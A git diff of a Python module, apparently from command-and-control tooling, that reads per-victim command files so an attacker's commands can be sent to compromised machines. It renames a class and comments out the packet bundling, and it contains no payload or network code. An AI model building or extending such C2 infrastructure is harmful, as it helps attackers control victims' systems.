@@ -1,31 +1,23 @@
 """Module designed to monitor commands issued by attacker to queue
 """
-from threading import Timer
+from threading import Thread, Timer
 # from ..utils.consts import DEFAULT_DATA_DIR, DEFAULT_CMD_FILE
 from utils.encrypt import Encrypter
-from ..bundler.bundler import Bundler
+from bundler.bundler import Bundler
 
 import math
 import os
 import time
 
-class CommandQueue():
+class CommandParser():
 
     def __init__(self, directory, command_file):
         
         self.dir = directory
         self.command_file = command_file
         self.victim_dirs = []
-        self.can_watch = False
 
-    def start_listening(self):
-        self.can_watch = True
-        self._watch()
-
-    def stop_listening(self):
-        self.can_watch = False
-
-    def _watch(self):
+    def parse(self):
         """Watch subdirectories for commands to send to the victims
         """
         # if self.can_watch:
@@ -35,9 +27,10 @@ class CommandQueue():
         self.victim_dirs = self._get_victim_dirs()
 
         # Iterate over directories and read command file
+        print('called')
         for dir in self.victim_dirs:
             if os.path.isfile(dir + '/input/' + self.command_file):
-                bundler = Bundler() # TODO: Pass in victim packet
+                # bundler = Bundler() # TODO: Pass in victim packet
                 with open(dir + '/input/' + self.command_file, 'r') as f:
                     commands = []
                     for line in f:
@@ -52,6 +45,8 @@ class CommandQueue():
                         # Send the packet
 
                 # os.remove(dir + '/input/' + self.command_file) # Done reading file
+
+        time.sleep(1000)
 
     def _get_victim_dirs(self):
         """Get corresponding victims that connected to the server
